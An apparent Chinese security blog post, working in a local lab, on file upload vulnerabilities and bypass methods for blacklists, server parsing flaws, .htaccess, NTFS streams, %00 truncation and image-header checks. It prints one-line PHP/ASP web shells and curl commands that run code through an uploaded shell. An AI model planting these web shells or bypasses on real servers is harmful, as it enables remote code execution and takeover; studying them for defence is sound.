@@ -1,0 +1,317 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>文件上传漏洞 | fengyun's Blog</title><meta name="keywords" content="web安全攻防"><meta name="author" content="长烟"><meta name="copyright" content="长烟"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一句话木马编写shell.php 1&lt;?php @eval($_POST[&amp;#x27;hacker&amp;#x27;]); ?&gt;  其中一句话木马通常利用的都是类似于php的eval这样的函数，eval函数获取hacker字段的值然后当成PHP代码执行，这种在服务器端能够执行代码的函数就是关键  asp 一句话木马：&lt;%execute(request(“value”))%&gt; ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="http://yunf194.github.io/2022/12/06/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="fengyun&#39;s Blog">
+<meta property="og:description" content="一句话木马编写shell.php 1&lt;?php @eval($_POST[&amp;#x27;hacker&amp;#x27;]); ?&gt;  其中一句话木马通常利用的都是类似于php的eval这样的函数，eval函数获取hacker字段的值然后当成PHP代码执行，这种在服务器端能够执行代码的函数就是关键  asp 一句话木马：&lt;%execute(request(“value”))%&gt; ph">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yunf194.github.io/images/cover/2.jpg">
+<meta property="article:published_time" content="2022-12-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-07T09:23:31.920Z">
+<meta property="article:author" content="长烟">
+<meta property="article:tag" content="web安全攻防">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yunf194.github.io/images/cover/2.jpg"><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://yunf194.github.io/2022/12/06/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?5b5317a4316878223f02ccad7d028fa5";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件上传漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-12-07 17:23:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/my.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://yunf194.github.io/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">116</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">32</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/cover/2.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">fengyun's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件上传漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-05T16:00:00.000Z" title="发表于 2022-12-06 00:00:00">2022-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-07T09:23:31.920Z" title="更新于 2022-12-07 17:23:31">2022-12-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">web安全攻防</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件上传漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>编写shell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中一句话木马通常利用的都是类似于php的eval这样的函数，eval函数获取hacker字段的值然后当成PHP代码执行，这种在服务器端能够执行代码的函数就是关键</p>
+<ul>
+<li>asp 一句话木马：&lt;%execute(request(“value”))%&gt;</li>
+<li>php 一句话木马：<?php @eval($_POST[“value”]);?></li>
+<li>aspx 一句话木马：<br>&lt;%@ Page Language=”Jscript”%&gt;<br>&lt;%eval(Request.Item[“value”])%&gt;</li>
+<li>其他一句话木马：<br>&lt;%eval request(“value”)%&gt;<br>&lt;%execute request(“value”)%&gt;<br>&lt;%execute(request(“value”))%&gt;  </li>
+</ul>
+<p><img src="/../images/2022127-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20221206171554892.png" alt="image-20221206171554892"></p>
+<p>点击upload上传文件<code>shell.php</code>（文件内容<code>&lt;?php @eval($_POST[&#39;hacker&#39;]); ?&gt;</code>），再点击<code>here</code>观察到文件位置是<code>http://127.0.0.1:8888/images/shell.php</code></p>
+<p>接下来使用curl指令发送http请求尝试执行此代码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fengyun@ubuntu:~/share/code$ curl -d <span class="string">&quot;hacker=echo getcwd();&quot;</span> http://127.0.0.1:8888/images/shell.php</span><br><span class="line">/app/images</span><br><span class="line"></span><br><span class="line">fengyun@ubuntu:~/share/code$ curl -d <span class="string">&quot;hacker=echo get_current_user();&quot;</span> http://127.0.0.1:8888/images/shell.php</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<p>可以看到php被成功执行了</p>
+<h2 id="后缀名绕过"><a href="#后缀名绕过" class="headerlink" title="后缀名绕过"></a>后缀名绕过</h2><p><img src="/../images/2022127-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20221206170849431.png" alt="image-20221206170849431"></p>
+<p>好的，我们继续将防护等级提高并且设为mid等级，此时对于上传文件有<strong>黑名单</strong>，可以发现无法上传<code>shell.php</code>这样以<code>php</code>结尾的文件了</p>
+<p>那么另辟蹊径地上传<code>shell.php3</code>文件</p>
+<p><img src="/../images/2022127-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20221206165623055.png" alt="image-20221206165623055"></p>
+<p><code>shell.php3</code>这样的文件类型是允许的，并且告诉了我们地址，访问这个文件如上图所示，同样的通过curl指令进行测试一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fengyun@ubuntu:~/share/code$ curl -d <span class="string">&quot;hacker=echo getcwd();&quot;</span> http://127.0.0.1:8888/images/shell.php3</span><br><span class="line">/app/images</span><br></pre></td></tr></table></figure>
+
+<p>这意味着<code>shell.php3</code>也可以成功地被执行。</p>
+<p>接下来修改文件名为<code>shell.php30</code>，可以看到也能正常上传，但是文件似乎以txt的形式直接回显给浏览器</p>
+<p><img src="/../images/2022127-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20221206165539811.png" alt="image-20221206165539811"></p>
+<p>同样地借助curl命令进行测试一下，发现这条语句无法直接被执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fengyun@ubuntu:~$ curl -d <span class="string">&quot;hacker=echo getcwd();&quot;</span> http://127.0.0.1:8888/images/shell.php30</span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对于webserver而言往往不知道后端使用什么语言的，但是对于各种后端语言例如PHP，Python，Java是可以解析的，这是因为通过加载的语言解析模块。<br>为了定位漏洞，打开此docker，使用<code>netstat</code>命令查看正在托管的web服务器的主要服务是apache2，因此查看apache2支持的语言解析模块是怎样的，apache2的配置文件在<code>/etc/apache2</code>目录下，观察config文件发现加载的都是<code>mods-enabled</code>文件夹下的文件</p>
+<p><img src="/../images/2022127-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20221206170050206.png" alt="image-20221206170050206"></p>
+<p>查看php的配置文件，观察php是如何配置的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@87e0fa3a1728:/etc/apache2/mods-enabled<span class="comment"># cat php5.conf </span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.+\.ph(p[345]?|t|tml)$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.+\.phps$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    <span class="comment"># Deny access to raw php sources by default</span></span><br><span class="line">    <span class="comment"># To re-enable it&#x27;s recommended to enable access to the files</span></span><br><span class="line">    <span class="comment"># only in specific virtual host or directory</span></span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment"># Deny access to files without filename (e.g. &#x27;.php&#x27;)</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;^\.ph(p[345]?|t|tml|ps)$&quot;</span>&gt;</span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Running PHP scripts in user directories is disabled by default</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># To re-enable PHP in user directories comment the following lines</span></span><br><span class="line"><span class="comment"># (from &lt;IfModule ...&gt; to &lt;/IfModule&gt;.) Do NOT set it to On as it</span></span><br><span class="line"><span class="comment"># prevents .htaccess files from disabling it.</span></span><br><span class="line">&lt;IfModule mod_userdir.c&gt;</span><br><span class="line">    &lt;Directory /home/*/public_html&gt;</span><br><span class="line">        php_admin_flag engine Off</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中仔细观察前3行，存在一个正则表达式<code>&lt;FilesMatch &quot;.+\.ph(p[345]?|t|tml)$&quot;&gt;</code>从这一句可以看出php3类型都会把文件解析指向php解析器，因此php3被webserver所解析，而php30不在正则表达式中，因此shell.php30被解析成了一个正常的文档，也就无法通过php30文件实现一句话木马。</p>
+<h2 id="服务器关联型漏洞"><a href="#服务器关联型漏洞" class="headerlink" title="服务器关联型漏洞"></a>服务器关联型漏洞</h2><h3 id="IIS-5-x-6-0-解析漏洞"><a href="#IIS-5-x-6-0-解析漏洞" class="headerlink" title="IIS 5.x / 6.0 解析漏洞"></a>IIS 5.x / 6.0 解析漏洞</h3><p>漏洞1：当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件<br>漏洞2：服务器默认不解析“;”以后的内容<br>漏洞利用形式：<br>漏洞1：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a> 会被解析成asp文件<br>漏洞2：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a> 会被解析成为asp文件  </p>
+<p>在windows平台调用解析asp文件时会调用<code>asp.dll</code>，其中代码里有一块不太完善的地方造成了上述漏洞，可以借助IDA和F5插件去找到相关代码段</p>
+<h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><p>在<strong>低版本Nginx</strong>中存在一个由<strong>PHP-CGI</strong>导致的文件解析漏洞。<br>PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的。<br><strong>当URL中有不存在的文件时，PHP就会默认向前解析。</strong></p>
+<p>漏洞利用流程：</p>
+<ol>
+<li>访问：<a target="_blank" rel="noopener" href="http://www.xx.com/phpinfo.jpg/1.php">www.xx.com/phpinfo.jpg/1.php</a> （1.php不存在）</li>
+<li>会解析phpinfo.jpg文件，<strong>但是按照php格式解析</strong> </li>
+</ol>
+<h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><p>Apache 在1.x和2.x版本中存在解析漏洞：<br>Apache<strong>从右至左开始判断后缀，跳过非可识别后缀，</strong>直到找到可识别后缀为止，然后将该可识别后缀进解析。</p>
+<p>漏洞利用流程：</p>
+<ol>
+<li>上传shell.php.test；</li>
+<li>访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。  </li>
+</ol>
+<h2 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h2><p>很多网站、CMS 都有使用，只在前端利用 JavaScript 来做校验。<br>漏洞利用流程（两种方法都可以）：</p>
+<ol>
+<li>通过Burp Suite抓包，然后修改内容后放行。</li>
+<li>通过Chrome禁止/删除JavaScript代码。(按一下F12然后对点击Elements，可以对元素进行删除或者修改)</li>
+</ol>
+<h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><p>什么是.htaccess?<br>.htaccess文件（<strong>分布式配置文件</strong>）提供了一种方式，使得配置文件可以随文件夹不同而不同，web服务器对网站不同部分做灵活调整，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。</p>
+<p>如何利用.htaccess?<br>场景：<strong>启用了.htaccess文件</strong>的网站，使用此文件类型来<strong>绕过限制较全面的黑名单过滤</strong>。</p>
+<p>使用.htaccess文件可以告诉目前作用的文件夹下可以去解析我们指定的某一类文件，尽管不能上传PHP等文件，但是可以上传jpg其他不在黑名单中的文件类型并且以PHP文件指定方式来解析</p>
+<ol>
+<li>上传一个<code>.htaccess</code>文件，文件内容设置为<code>AddType application/x-httpd-php .test</code>（将<code>test</code>文件以<code>PHP</code>代码解析）。</li>
+<li>上传一句话木马文件，文件名设置为<code>shell.test</code>。</li>
+<li>在浏览器中访问<code>shell.test</code>即可执行一句话木马。</li>
+</ol>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>这是一种比较简单的绕过方式，<strong>同样针对黑名单。</strong><br>如果我们想上传一个php木马，那么我们可以上传一个pHp即可。</p>
+<p>值得思考的问题出现了</p>
+<ol>
+<li>php真的等同于pHp吗？</li>
+<li>如果不等同，为什么pHp可以执行呢？  </li>
+</ol>
+<p>windows下对大小写（<code>test.txt</code>和<code>test.tXt</code>会被当成同一个文件）不敏感，Linux对大小写敏感</p>
+<h2 id="windows文件流绕过"><a href="#windows文件流绕过" class="headerlink" title="windows文件流绕过"></a>windows文件流绕过</h2><p>什么是Windows文件流？</p>
+<p>NTFS文件系统实现了<strong>多文件流特性</strong>，NTFS环境一个文件<strong>默认使用的是未命名的文件流</strong>，同时可创建其他命名的文件流，<strong>Windows资源管理器默认不显示出文件的命名文件流</strong>，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。</p>
+<p>我们来用Windows平台做一些测试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Echo 111 &gt; test.txt:111.txt；  //文件流是111.txt</span><br><span class="line">Echo <span class="built_in">test</span> &gt; test.txt；		  //未命名的文件流</span><br><span class="line">Echo 222 &gt; test.txt::<span class="variable">$data</span>；	  //往test.txt的默认数据流输入222,等价于Echo 222 &gt; test.txt</span><br></pre></td></tr></table></figure>
+
+<p>当上传的功能点做一些文件严格类型匹配的时候，可以输入某个文件流，以此达到 既符合我们要求的一个文件类型的上传，又可以满足解析的时候去解析另一个类型  的目的</p>
+<p>文件流只适用于Windows环境下，比如站点禁止上传扩展名为.php的文件，那我们通过文件流的方式，将文件的扩展名修改为.php::$DATA，就可以成功绕过过滤，而对于windows系统来说这就是一个普通的文件，依旧会被作为php文件解析</p>
+<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><p>可以看到黑名单会存在巨大的被绕过的风险，无论是服务器原因还是操作系统原因，那么白名单是否完全安全呢？  尽管白名单安全性高于黑名单检测，然而也是存在漏洞的</p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207153635826.png" alt="image-20221207153635826"></p>
+<p>可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候（代码第9行），是路径拼接的形式，而<strong>路径又是从前端获取，可以用户控制输入的</strong>，所以我们可以采用在路径上截断。  </p>
+<ol>
+<li>设置save_path=../upload/a.php%00</li>
+<li>上传一个内容为一句话木马的jpg文件</li>
+</ol>
+<p>这里上传一个文件<code>abc.php.jpg</code>并且打开burp suite进行截断</p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207171815947.png" alt="image-20221207171815947"></p>
+<p>转为16进制后，在php后面那个字符修改为00尝试截断</p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207171846334.png" alt="image-20221207171846334"></p>
+<p>文件图片成功上传，服务器在判断文件名的时候去按照png结尾（而不是php）的方式判断了文件类型，abc.php%00.png可以通过文件扩展名的过滤，.jpg会作为文件的扩展名进行匹配。但因为截断的存在文件名会被理解为a.php，会使用php解释器来解析该文件。</p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207171905762.png" alt="image-20221207171905762"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fengyun@ubuntu:~/share/code$ curl -d <span class="string">&quot;hacker=echo getcwd();&quot;</span> http://127.0.0.1:8888/images/abc.php</span><br><span class="line">/app/images</span><br></pre></td></tr></table></figure>
+
+<p>截断方式可以生效的根本原因是什么：<br>是我们可以 <strong>分别控制 存储路径 及 文件名称</strong><br>这样我们才可以实现<strong>通过文件名称校验的同时存储为php文件</strong>  </p>
+<h2 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h2><p>针对于常见的文件，通常会检测文件头的前几个字符，如下图所示</p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207155609029.png" alt="image-20221207155609029"></p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207155622978.png" alt="image-20221207155622978"></p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207155630922.png" alt="image-20221207155630922"></p>
+<p>如果直接上传一句话木马，通常是无法上传的，这里准备了一个test.png文件和test.php文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fengyun@ubuntu:~/share/code$ cat test.png</span><br><span class="line">�PNG</span><br><span class="line">�</span><br><span class="line">IHD��</span><br><span class="line">fengyun@ubuntu:~/share/code$ cat test.php</span><br><span class="line">&lt;?php <span class="built_in">echo</span> <span class="string">&#x27;test&#x27;</span>; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>采用<code>&gt;&gt;</code>追加在png尾部进行拼接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fengyun@ubuntu:~/share/code$ cp test.png test2.png</span><br><span class="line">fengyun@ubuntu:~/share/code$ cat test.php &gt;&gt; test2.png</span><br><span class="line">fengyun@ubuntu:~/share/code$ cat test2.png</span><br><span class="line">�PNG</span><br><span class="line">�</span><br><span class="line">IHD��&lt;?php <span class="built_in">echo</span> <span class="string">&#x27;test&#x27;</span>; ?&gt;</span><br><span class="line">fengyun@ubuntu:~/share/code$ php test2.png</span><br><span class="line">�PNG</span><br><span class="line">�</span><br><span class="line">IHD��<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>他既满足文件头部的内容检测，又可以执行相应的指令代码段。<br>但是非常需要注意的一点是，图片的格式是偏向二进制的格式，程序解析器碰到无法解析的字符就无法解析下去了，因此需要把图片的无关内容大量删减后再进行拼接成功率能够提高。</p>
+<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>继续调高难度，将防护level调为high，发现只能上传jpg和png文件</p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207161123626.png" alt="image-20221207161123626"></p>
+<p>尝试进入网站根目录仔细地查看一下文件上传这个功能的具体实现</p>
